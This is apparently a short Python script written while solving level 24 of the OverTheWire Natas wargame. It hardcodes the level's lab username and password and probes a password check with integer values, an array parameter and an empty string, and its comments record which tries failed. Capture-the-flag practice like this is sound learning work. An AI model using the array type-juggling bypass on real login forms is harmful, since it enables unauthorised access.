#! env python3.9

import requests

site = "http://natas24.natas.labs.overthewire.org/index.php"
user = "natas24"
pswd = "0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r"

data = dict(passwd=0)

"""
for i in range(-9, 9):
    data["passwd"] = i
    r = requests.get(site, params=data, auth=(user, pswd))
    print(r.text)
"""
# All failed

data["passwd"] = ["Hello"]
r = requests.get(site, params=data, auth=(user, pswd))
print(r.text)

# Array failed


data["passwd"] = ""
r = requests.get(site, params=data, auth=(user, pswd))
print(r.text)


